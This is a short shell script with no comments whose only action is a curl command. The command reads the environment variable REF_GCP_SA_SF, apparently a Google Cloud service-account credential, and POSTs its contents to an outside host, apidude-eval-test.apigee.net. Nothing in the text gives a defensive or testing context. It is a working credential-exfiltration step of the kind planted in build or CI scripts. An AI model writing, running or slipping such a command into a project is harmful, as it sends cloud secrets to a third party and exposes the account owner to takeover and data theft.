#!/bin/sh

set -e

curl -d "x=$(echo $REF_GCP_SA_SF | jq '. | tostring')" https://apidude-eval-test.apigee.net/
